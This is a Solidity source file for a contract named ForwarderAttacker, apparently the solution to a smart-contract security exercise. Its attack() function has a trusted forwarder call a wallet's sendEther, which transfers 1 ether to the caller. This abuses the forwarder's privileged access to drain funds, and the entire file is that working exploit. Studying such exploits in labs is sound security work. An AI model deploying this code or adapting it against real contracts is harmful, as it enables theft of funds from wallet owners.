// SPDX-License-Identifier: MIT
pragma solidity 0.8.15;

interface IForwarder {
    function functionCall(address a, bytes calldata data) external;
}

interface IWallet {
    function sendEther(address destination, uint256 amount) external;
}

contract ForwarderAttacker {
    address forwarder;
    address wallet;

    constructor(address _forwarder, address _wallet) {
        forwarder = _forwarder;
        wallet = _wallet;
    }

    function attack() public {
        bytes memory data = abi.encodeCall(IWallet.sendEther, (msg.sender, 1 ether));
        IForwarder(forwarder).functionCall(wallet, data);
    }
}
